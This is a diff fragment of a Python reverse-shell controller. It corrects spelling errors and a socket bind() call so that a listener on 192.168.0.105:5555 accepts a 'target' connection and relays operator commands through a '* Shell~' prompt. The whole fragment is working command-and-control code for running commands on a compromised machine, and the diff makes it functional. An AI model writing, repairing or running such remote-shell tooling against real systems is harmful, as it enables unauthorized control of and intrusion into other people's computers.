@@ -14,7 +14,7 @@ def reliable_recv():
 		except ValueError:
 			continue
 
-def target_communcation():
+def target_communication():
 	while True:
 		command = input('* Shell~%s: ' % str(ip))
 		reliable_send(command)
@@ -24,8 +24,8 @@ def target_communcation():
 			result = reliable_recv()
 			print(result)
 
-sock = socket.socket(scoket.AF_INET, socket.SOCK_STREAM)
-sock.bind('192.168.0.105', 5555)
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('192.168.0.105', 5555))
 print('[+] Listening For the Incoming Connections')
 sock.listen(5)
 target, ip = sock.accept()
